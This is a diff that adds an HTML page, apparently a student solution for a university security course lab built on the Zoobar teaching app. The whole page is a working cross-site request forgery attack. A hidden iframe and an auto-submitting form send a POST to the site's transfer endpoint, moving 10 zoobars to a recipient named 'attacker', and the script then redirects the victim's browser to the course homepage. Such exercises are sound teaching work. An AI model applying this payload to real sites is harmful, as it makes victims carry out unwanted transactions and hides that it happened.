@@ -1,0 +1,17 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+    <body>
+	<iframe name="zoobar" src="http://zoobar.csl.toronto.edu/transfer.php" style="visibility: hidden"></iframe>
+
+	<form onsubmit="redirectFunction()" target="zoobar" id="B" name="transfer_form" action="http://zoobar.csl.toronto.edu/transfer.php" method="POST">
+  		<input type=text name=zoobars value=10 size=5>
+		<input type=text name=zb_recipient value=attacker>
+		<input id="sub" type=submit name=submission value=Send>
+	</form>
+    	<script type="text/javascript">
+		document.getElementById("B").submit();
+		document.getElementById("sub").click();
+		function redirectFunction() {window.location.href = "http://ece568.csl.toronto.edu/";}	 
+	</script>   
+    </body>
+</html>
